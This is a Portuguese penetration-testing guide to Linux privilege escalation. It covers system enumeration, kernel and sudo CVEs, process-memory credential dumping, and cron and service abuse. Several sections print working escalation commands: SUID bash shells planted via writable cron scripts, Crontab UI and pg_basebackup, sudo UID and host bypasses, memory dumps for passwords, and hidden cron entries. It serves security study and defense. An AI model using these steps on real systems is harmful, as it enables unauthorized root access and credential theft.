# Escalonamento de privilégios no Linux

{{#include ../../../banners/hacktricks-training.md}}

Para obter um contexto mais amplo e conhecer fluxos históricos de enumeração, consulte os recursos g0tmi1k, Payatu, SANS, LPE Workshop, Linux-Privilege-Escalation e linux-private-i listados nas referências.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[10]](#references)[[11]](#references)[[13]](#references)</sup>

## Informações do sistema

### Informações do SO

Vamos começar obtendo informações sobre o SO em execução.

```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```

### Path

Se você **tiver permissões de escrita em alguma pasta dentro da variável `PATH`**, poderá sequestrar algumas bibliotecas ou binários:

```bash
echo $PATH
```

### Informações do ambiente

Informações interessantes, senhas ou chaves de API nas variáveis de ambiente?

```bash
(env || set) 2>/dev/null
```

### Exploits de kernel

Verifique a versão do kernel e se há algum exploit que possa ser usado para elevar privilégios.

A seção [Kernel/LPE/CVE](../../main-system-information/kernel-lpe-cves/README.md) reúne casos de escalada local e links para write-ups mais aprofundados sobre o kernel do Linux em Binary Exploitation. Verifique a build e a configuração afetadas antes de testar um caso de estudo.

```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```

Você pode encontrar uma boa lista de kernels vulneráveis e alguns **exploits já compilados** aqui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).<sup>[[12]](#references)</sup>\
Outros sites onde você pode encontrar alguns **exploits compilados**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Para extrair todas as versões vulneráveis do kernel desse site, você pode fazer:

```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```

Ferramentas que podem ajudar a procurar exploits para o kernel:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute NA vítima; só verifica exploits para o kernel 2.x)

Sempre **pesquise a versão do kernel no Google**. Talvez a versão do seu kernel esteja mencionada em algum exploit, e assim você terá certeza de que ele é válido.

Técnicas adicionais de exploração do kernel:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Escalação de privilégios no Linux - Linux Kernel <= 3.19.0-73.8

```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```

### Versão do Sudo

Com base nas versões vulneráveis do sudo que aparecem em:

```bash
searchsploit sudo
```

Você pode verificar se a versão do sudo é vulnerável usando este grep.

```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```

### Sudo < 1.9.17p1

O sudo upstream **1.9.14 até 1.9.17** permite que usuários locais sem privilégios escalem para root por meio da opção `--chroot` quando o sudo carrega `/etc/nsswitch.conf` de um diretório controlado pelo usuário; o upstream corrigiu isso na versão **1.9.17p1**. Verifique todos os binários sudo executáveis com root-setuid nos caminhos relevantes, pois `sudo -V` informa apenas o binário selecionado por `PATH`. Pacotes de distribuições podem incluir o patch sem alterar a string de versão upstream, então verifique também o status do pacote do fornecedor. Consulte o [comunicado do mantenedor do sudo](https://www.openwall.com/lists/oss-security/2025/06/30/3).<sup>[[28]](#references)[[29]](#references)</sup>

Aqui está um [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) para explorar essa [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Antes de executar o exploit, verifique se sua versão do `sudo` é vulnerável e se oferece suporte ao recurso `chroot`.  

Para mais informações, consulte o [comunicado original sobre a vulnerability](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).<sup>[[28]](#references)</sup>

### Desvio de regras do sudo baseadas em host (CVE-2025-32462)

O sudo upstream **1.8.8 até 1.9.17** pode avaliar regras do sudoers baseadas em host usando o **hostname fornecido pelo usuário** em `sudo -h <host>`, em vez do **hostname real**; o upstream corrigiu isso na versão **1.9.17p1**. Ainda é necessário que o usuário tenha uma entrada correspondente no sudoers do host selecionado. Verifique também os backports do fornecedor e os binários sudo alternativos, além da política local. Consulte o [comunicado do mantenedor do sudo](https://www.openwall.com/lists/oss-security/2025/06/30/2).<sup>[[29]](#references)</sup>

Requisitos:
- Versão vulnerável do sudo
- Regras do sudoers específicas para o host (o host não pode ser o hostname atual nem `ALL`)

Padrão de exemplo do sudoers:

```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```

Explore fazendo spoofing do host permitido:

```bash
sudo -h devbox id
sudo -h devbox -i
```

Se a resolução do nome selecionado bloquear, verifique como esse nome é resolvido no host. Ver um nome em um log ou arquivo de configuração não significa que ele possa ser resolvido, e alterar `/etc/hosts` normalmente exige acesso de escrita privilegiado.

#### sudo < v1.8.28

Este [bypass de Runas UID upstream](https://ubuntu.com/security/CVE-2019-14287) exige uma regra sudo efetiva que permita executar um comando como qualquer usuário, exceto root, como `(ALL, !root) /bin/bash`. O solicitante também precisa ter permissão para usar essa regra, incluindo qualquer requisito de autenticação. Consulte o aviso do pacote instalado: os fornecedores fizeram backport da correção para versões cuja versão upstream exibida ainda é inferior a 1.8.28. Uma regra `!root` ou uma versão antiga, por si só, não confirma que o sistema está vulnerável. Não teste um comando privilegiado durante a enumeração passiva.

```
sudo -u#-1 /bin/bash
```

### Falha na verificação da assinatura do Dmesg

Confira a **box smasher2 do HTB** para ver um **exemplo** de como essa vuln poderia ser explorada.

```bash
dmesg 2>/dev/null | grep "signature"
```

### Mais enumeração do sistema

```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```

## Enumerar possíveis defesas

### AppArmor

```bash
if [ `which aa-status 2>/dev/null` ]; then
    aa-status
  elif [ `which apparmor_status 2>/dev/null` ]; then
    apparmor_status
  elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
    ls -d /etc/apparmor*
  else
    echo "Not found AppArmor"
fi
```

### Grsecurity

```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```

### PaX

```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```

### Execshield

```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```

### SElinux

```bash
 (sestatus 2>/dev/null || echo "Not found sestatus")
```

### ASLR

```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```

## Container Breakout

Se você estiver dentro de um container, comece pela seção a seguir sobre segurança de containers e depois passe para as páginas de abuso específicas do runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Unidades

Verifique **o que está montado e desmontado**, onde e por quê. Se algo estiver desmontado, você pode tentar montá-lo e verificar se há informações privadas.

```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```

## Software útil

Enumerar binários úteis

```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```

Além disso, verifique se **há algum compilador instalado**. Isso é útil caso você precise usar algum exploit de kernel, pois recomenda-se compilá-lo na máquina em que você pretende usá-lo (ou em uma semelhante).

```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```

### Software vulnerável instalado

Verifique a **versão dos pacotes e serviços instalados**. Talvez exista uma versão antiga do Nagios, por exemplo, que possa ser explorada para escalar privilégios…\
Recomenda-se verificar manualmente a versão dos softwares instalados mais suspeitos.

```bash
dpkg -l #Debian
rpm -qa #Centos
```

Se você tiver acesso SSH à máquina, também pode usar **openVAS** para verificar se há software desatualizado e vulnerável instalado nela.

> [!NOTE] > _Observe que esses comandos mostrarão muitas informações, que em sua maioria serão inúteis. Portanto, recomenda-se usar aplicativos como OpenVAS ou similares para verificar se alguma versão do software instalado está vulnerável a exploits conhecidos_

## Processes

Observe **quais processos** estão sendo executados e verifique se algum deles tem **mais privilégios do que deveria** (talvez um tomcat sendo executado pelo root?).

```bash
ps aux
ps -ef
top -n 1
```

Sempre verifique se há [**electron/cef/chromium debuggers**](../../software-information/electron-cef-chromium-debugger-abuse.md) em execução; você pode abusar deles para escalar privilégios. **Linpeas** os detecta verificando o parâmetro `--inspect` na linha de comando do processo.\
Além disso, **verifique seus privilégios sobre os binários dos processos**; talvez você possa sobrescrever algum deles.

### Cadeias pai-filho entre usuários

Um processo filho executado sob um **usuário diferente** do processo pai não é automaticamente malicioso, mas é um **sinal útil para triagem**. Algumas transições são esperadas (`root` iniciando um usuário de serviço, gerenciadores de login criando processos de sessão), mas cadeias incomuns podem revelar wrappers, debug helpers, persistência ou limites fracos de confiança do runtime.

Revisão rápida:

```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```

Se encontrar uma cadeia surpreendente, inspecione a linha de comando do processo pai e todos os arquivos que influenciam seu comportamento (`config`, `EnvironmentFile`, scripts auxiliares, diretório de trabalho, argumentos graváveis). Em vários caminhos reais de privesc, o processo filho não podia ser gravado, mas a **configuração controlada pelo processo pai** ou a cadeia de scripts auxiliares podia.

### Executáveis excluídos e arquivos abertos excluídos

Artefatos de runtime geralmente continuam acessíveis **após a exclusão**. Isso é útil tanto para escalação de privilégios quanto para recuperar evidências de um processo que já tem arquivos sensíveis abertos.

Verifique se há executáveis excluídos:

```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```

Se `/proc/<PID>/exe` apontar para `(deleted)`, o processo ainda está executando a imagem binária antiga, carregada na memória. Esse é um forte indício para investigar, pois:

- o executável removido pode conter strings ou credenciais interessantes
- o processo em execução ainda pode expor descritores de arquivo úteis
- um binário privilegiado removido pode indicar adulteração recente ou uma tentativa de apagar rastros

Colete globalmente os arquivos removidos que ainda estão abertos:

```bash
lsof +L1
```

Se encontrar um descritor interessante, recupere-o diretamente:

```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```

Isso é especialmente valioso quando um processo ainda mantém aberto um segredo, script, exportação de banco de dados ou arquivo de flag excluído.

### Monitoramento de processos

Você pode usar ferramentas como [**pspy**](https://github.com/DominicBreuker/pspy) para monitorar processos. Isso pode ser muito útil para identificar processos vulneráveis que são executados com frequência ou quando um conjunto de requisitos é atendido.

#### ProcMon para Linux com sudo

O [ProcMon para Linux](https://github.com/microsoft/ProcMon-for-Linux) pode rastrear processos e chamadas de sistema selecionados e salvar um rastreamento SQLite. Se `sudo -l` permitir executar o comando `procmon`, com capacidade de root e sem restrições, considere se ele poderia observar a entrada ou saída do processo de outro usuário. Essa permissão é apenas uma pista para investigação: o suporte do tracer, a política efetiva e a atividade de um processo adequado são fatores relevantes. Arquivos de rastreamento podem conter segredos, portanto inspecione cuidadosamente as exportações autorizadas e evite coletar dados de processos não relacionados.

### Memória do processo

Alguns serviços de um servidor salvam **credenciais em texto não criptografado na memória**.\
Normalmente, você precisará de **privilégios de root** para ler a memória de processos pertencentes a outros usuários; portanto, isso costuma ser mais útil quando você já é root e quer descobrir mais credenciais.\
No entanto, lembre-se de que **como usuário comum você pode ler a memória dos processos que possui**.

> [!WARNING]
> Observe que hoje em dia a maioria das máquinas **não permite ptrace por padrão**, o que significa que você não pode despejar outros processos que pertençam ao seu usuário sem privilégios.
>
> O arquivo _**/proc/sys/kernel/yama/ptrace_scope**_ controla a acessibilidade do ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: todos os processos podem ser depurados, desde que tenham o mesmo UID. Essa é a forma clássica de funcionamento do ptrace.
> - **kernel.yama.ptrace_scope = 1**: somente um processo pai pode ser depurado.
> - **kernel.yama.ptrace_scope = 2**: somente um administrador pode usar ptrace, pois é necessário ter a capacidade CAP_SYS_PTRACE.
> - **kernel.yama.ptrace_scope = 3**: nenhum processo pode ser rastreado com ptrace. Depois de definido, é necessário reiniciar o sistema para habilitar o ptrace novamente.

Um processo com o mesmo UID que desbloqueia brevemente um cofre de senhas pode representar um limite de credenciais separado. Quando o rastreamento é permitido, um processo ativo e dumpável pode expor a senha do cofre por meio de suas chamadas de sistema de entrada ou da memória, mesmo que o próprio arquivo do cofre criptografado permaneça protegido. `ptrace_scope=0` é apenas um dos pré-requisitos: credenciais correspondentes, possibilidade de dump do processo-alvo, outros módulos de segurança do Linux e o tempo de vida do processo também são relevantes. Usar uma credencial de uma entrada do cofre para fazer login como root no Unix exige uma verificação separada de reutilização de credenciais. A enumeração de rotina deve informar a política e os caminhos candidatos de processos ou cofres, sem capturar entradas nem exibir segredos. Consulte a [documentação do Yama do kernel](https://cdn.kernel.org/doc/html/latest/admin-guide/LSM/Yama.html) e as [verificações de acesso do ptrace](https://man7.org/linux/man-pages/man2/ptrace.2.html).

#### GDB

Se você tiver acesso à memória de um serviço FTP, por exemplo, poderá obter o Heap e pesquisar nele as credenciais.

```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```

#### Script do GDB

```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
    | sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
    | while read start stop; do \
    gdb --batch --pid $1 -ex \
    "dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```

#### /proc/$pid/maps & /proc/$pid/mem

Para um determinado ID de processo, **maps mostra como a memória é mapeada no espaço de endereçamento virtual desse processo**; também mostra as **permissões de cada região mapeada**. O arquivo pseudo **mem expõe a própria memória do processo**. Pelo arquivo **maps**, sabemos quais **regiões de memória são legíveis** e seus offsets. Usamos essas informações para **posicionar o cursor no arquivo mem e fazer dump de todas as regiões legíveis** para um arquivo.

```bash
procdump()
(
    cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
    while read a b; do
        dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
           skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
    done )
    cat $1*.bin > $1.dump
    rm $1*.bin
)
```

#### /dev/mem

`/dev/mem` fornece acesso à memória **física** do sistema, não à memória virtual. O espaço de endereçamento virtual do kernel pode ser acessado usando /dev/kmem.\
Normalmente, `/dev/mem` só pode ser lido pelo **root** e pelo grupo **kmem**.

```
strings /dev/mem -n10 | grep -i PASS
```

### ProcDump para Linux

ProcDump é uma recriação para Linux da clássica ferramenta ProcDump, da suíte de ferramentas Sysinternals para Windows. Obtenha-a em [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)

```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```

### Ferramentas

Para despejar a memória de um processo, você pode usar:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Você pode remover manualmente os requisitos de root e despejar o processo de sua propriedade
- Script A.5 de [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (é necessário root)

### Credenciais da memória do processo

#### Exemplo manual

Se você descobrir que o processo authenticator está em execução:

```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```

Você pode fazer o dump do processo (consulte as seções anteriores para encontrar diferentes maneiras de fazer o dump da memória de um processo) e procurar credenciais na memória:

```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```

#### mimipenguin

A ferramenta [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **rouba credenciais em texto simples da memória** e de alguns **arquivos conhecidos**. Ela precisa de privilégios de root para funcionar corretamente.

| Recurso                                           | Nome do processo     |
| ------------------------------------------------- | -------------------- |
| Senha do GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (conexões FTP ativas)                      | vsftpd               |
| Apache2 (sessões HTTP Basic Auth ativas)          | apache2              |
| OpenSSH (sessões SSH ativas - uso do Sudo)        | sshd:                |

#### Expressões regulares de busca/[truffleproc](https://github.com/controlplaneio/truffleproc)

```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```

## Tarefas agendadas/Cron

### Crontab UI (alseambusher) executado como root – escalada de privilégios por scheduler baseado na web

Se um painel web “Crontab UI” (alseambusher/crontab-ui) for executado como root e estiver vinculado apenas ao loopback, ainda será possível acessá-lo por meio de encaminhamento local de porta SSH e criar uma tarefa privilegiada para escalar privilégios.<sup>[[1]](#references)[[4]](#references)</sup>

Cadeia típica
- Descubra uma porta disponível apenas no loopback (por exemplo, 127.0.0.1:8000) e o realm de Basic-Auth via `ss -ntlp` / `curl -v localhost:8000`
- Encontre credenciais em artefatos operacionais:
  - Backups/scripts com `zip -P <password>`
  - Unit do systemd expondo `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Crie o túnel e faça login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Crie um job com privilégios elevados e execute-o imediatamente (cria um shell SUID):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Use-o:
```bash
/tmp/rootshell -p   # root shell
```

Fortalecimento
- Não execute a interface do Crontab como root; use um usuário dedicado e permissões mínimas
- Vincule a localhost e restrinja também o acesso por meio de firewall/VPN; não reutilize senhas
- Evite incluir segredos em arquivos de unidade; use repositórios de segredos ou um EnvironmentFile acessível apenas por root
- Habilite auditoria/logging para execuções de jobs sob demanda

Verifique se algum job agendado é vulnerável. Talvez você possa tirar proveito de um script executado por root (vulnerabilidade de wildcard? Você consegue modificar arquivos usados por root? Usar symlinks? Criar arquivos específicos no diretório usado por root?).

```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```

Se `run-parts` for usado, verifique quais nomes serão realmente executados:

```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```

Isso evita falsos positivos. Um diretório periódico gravável só é útil se o nome do arquivo do seu payload corresponder às regras locais de `run-parts`.

### Caminho do Cron

Por exemplo, dentro de _/etc/crontab_ você pode encontrar o PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Observe que o usuário "user" tem permissão de escrita em /home/user_)

Se, dentro desse crontab, o usuário root tentar executar algum comando ou script sem definir o caminho. Por exemplo: _\* \* \* \* root overwrite.sh_\
Então, você pode obter um shell de root usando:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```

### Cron usando um script com um curinga (Wildcard Injection)

Se um script executado pelo root tiver um “**\***” dentro de um comando, você pode explorar isso para fazer coisas inesperadas (como privesc). Exemplo:

```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```

**Se o wildcard for precedido por um caminho como** _**/some/path/\***_ **, não é vulnerável (nem mesmo** _**./\***_ **).**

Leia a página a seguir para conhecer outros truques de exploração de wildcards:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injeção via expansão aritmética do Bash em parsers de logs do cron

A aritmética do Bash pode interpretar texto não confiável como uma expressão. Em contextos afetados do Bash, um índice de array dentro dessa expressão pode avaliar uma substituição de comando. Se um parser privilegiado do cron inserir texto de log controlado por um atacante em uma comparação aritmética, a substituição poderá ser executada com a identidade do parser.<sup>[[22]](#references)</sup> Isso depende da expressão exata do Bash e da versão; uma string simples `$(...)0` em uma variável expandida não é, por si só, uma demonstração confiável de reavaliação.

A entrada também pode vir de metadados de arquivos ou de outro campo lido de um local gravável pelo usuário. Por exemplo, um script de limpeza privilegiado que lê uma tag `Producer` de uma imagem e a compara usando `[[ "$producer" -eq "expected" ]]` faz uma comparação aritmética, mesmo que a variável esteja entre aspas. Verifique a identidade usada na tarefa agendada, quais arquivos podem fornecer a tag, quaisquer transformações feitas antes da comparação e o comportamento exato do Bash. Para rótulos de texto, use uma comparação de strings; para números, valide a entrada para garantir que contenha apenas dígitos decimais antes de fazer operações aritméticas. Consulte as [regras de aritmética do Bash](https://www.gnu.org/software/bash/manual/html_node/Shell-Arithmetic.html).

- Padrão vulnerável típico:
  ```bash
  #!/bin/bash
  # Example: parse a log and "sum" a count field coming from the log
  while IFS=',' read -r ts user count rest; do
      # count is untrusted if the log is attacker-controlled
      (( total += count ))     # or: let "n=$count"
  done < /var/www/app/log/application.log
  ```

- Sonda segura do comportamento local para o mecanismo de subscrito de array (sem processo privilegiado ou alteração de arquivos):
  ```bash
  code='x[$(printf marker >&2)]'
  [[ 200 -eq "$code" ]]
  # Bash may print "marker" while evaluating the arithmetic operand.
  ```

Trace o script agendado real e o caminho literal de entrada que ele abre. Mesmo quando o próprio arquivo de log não pode ser escrito, um usuário que possa escrever e percorrer o diretório pai sem sticky bit talvez consiga substituir a entrada desse diretório; `namei -l` ajuda a distinguir essas permissões. Um caminho de log gravável diferente, um agendador ilegível ou um parser que nunca avalia esse campo como aritmética Bash não comprovam esse vetor.

### Cron script overwriting and symlink

Se você **pode modificar um script do cron** executado como root, é muito fácil obter um shell:

```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```

Se o script executado pelo root usa um **diretório ao qual você tem acesso total**, talvez seja útil excluir essa pasta e **criar um diretório de link simbólico apontando para outro**, que contenha um script controlado por você.

```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```

### Validação de symlinks e tratamento mais seguro de arquivos

Ao revisar scripts/binários privilegiados que leem ou gravam arquivos por caminho, verifique como os links são tratados:

- `stat()` segue um symlink e retorna os metadados do destino.
- `lstat()` retorna os metadados do próprio link.
- `readlink -f` e `namei -l` ajudam a resolver o destino final e mostram as permissões de cada componente do caminho.

```bash
readlink -f /path/to/link
namei -l /path/to/link
```

Para defensores/desenvolvedores, padrões mais seguros contra técnicas com symlink incluem:

- `O_EXCL` com `O_CREAT`: falha se o caminho já existir (bloqueia links/arquivos pré-criados pelo atacante).
- `openat()`: opera relativamente a um descritor de arquivo de diretório confiável.
- `mkstemp()`: cria arquivos temporários atomicamente com permissões seguras.

### Binários do cron com assinatura personalizada e payloads graváveis
Um usuário comum que pode gravar no binário exato executado por um cron job do root pode cruzar uma fronteira de privilégios, mas uma verificação de assinatura personalizada pode rejeitar uma substituição sem assinatura. No caso documentado, o ELF pertencente ao root tinha modo `0760`, permitindo que um membro do grupo o gravasse enquanto o proprietário root podia executá-lo. Um rastreamento de processos visível mostrou o `objcopy` extraindo `.text_sig` antes de o job executar o binário; o script completo do verificador não estava legível.<sup>[[2]](#references)</sup>

A substituição que funcionou foi assinada com material de assinatura privado vazado, usando um assinador de ELF. A [documentação do formato](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) descreve uma seção de assinatura derivada de `.text` do executável. Não há indicação de que apenas adicionar um certificado ou uma string correspondente a `.text_sig` seja suficiente para satisfazer o verificador não visível. Verifique o caminho agendado real, o acesso efetivo de gravação, a invocação pelo root e a política do verificador antes de concluir que um binário gravável com assinatura é explorável. Uma seção `.text_sig`, por si só, é apenas um indício para análise.

### Jobs frequentes do cron

Você pode monitorar os processos para procurar processos executados a cada 1, 2 ou 5 minutos. Talvez você possa tirar proveito disso e escalar privilégios.

Por exemplo, para **monitorar a cada 0.1s durante 1 minuto**, **ordenar pelos comandos executados com menos frequência** e excluir os comandos que foram executados mais vezes, você pode fazer:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**Você também pode usar** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (isso monitorará e listará todos os processos iniciados).

### Backups de root que preservam bits de modo definidos pelo atacante (pg_basebackup)

Se um cron de propriedade do root executar `pg_basebackup` (ou qualquer cópia recursiva) em um diretório de banco de dados no qual você pode gravar, você pode inserir um **binário SUID/SGID** que será copiado novamente como **root:root**, com os mesmos bits de modo, para o destino do backup.<sup>[[26]](#references)</sup>

Fluxo típico de descoberta (como usuário de baixo privilégio do DB):
- Use `pspy` para identificar um cron de root que chama algo como `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` a cada minuto.
- Confirme que você pode gravar no cluster de origem (por exemplo, `/var/lib/postgresql/14/main`) e que o destino (`/opt/backups/current`) passa a pertencer ao root após a execução do job.

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

Isso funciona porque `pg_basebackup` preserva os bits de modo dos arquivos ao copiar o cluster; quando executado por root, os arquivos de destino herdam **propriedade de root + SUID/SGID escolhidos pelo atacante**. Qualquer rotina semelhante de backup/cópia privilegiada que mantenha as permissões e grave em um local executável é vulnerável.

### Tarefas cron invisíveis

É possível criar uma tarefa cron **colocando um retorno de carro após um comentário** (sem caractere de nova linha), e a tarefa cron funcionará. Exemplo (observe o caractere de retorno de carro):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

Para detectar esse tipo de entrada furtiva, inspecione os arquivos cron com ferramentas que exibam caracteres de controle:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## Serviços

### Arquivos _.service_ com permissão de escrita

Verifique se você pode gravar em algum arquivo `.service`. Se puder, **poderá modificá-lo** para que **execute** seu **backdoor quando** o serviço for **iniciado**, **reiniciado** ou **parado** (talvez seja necessário esperar até que a máquina seja reinicializada).\
Por exemplo, crie seu backdoor dentro do arquivo .service com **`ExecStart=/tmp/script.sh`**

### Binários de serviço com permissão de escrita

Lembre-se de que, se você tiver **permissões de escrita sobre binários executados por serviços**, poderá substituí-los por backdoors para que, quando os serviços forem executados novamente, os backdoors sejam executados.

### PATH do systemd - Caminhos relativos

Você pode ver o PATH usado pelo **systemd** com:

```bash
systemctl show-environment
```

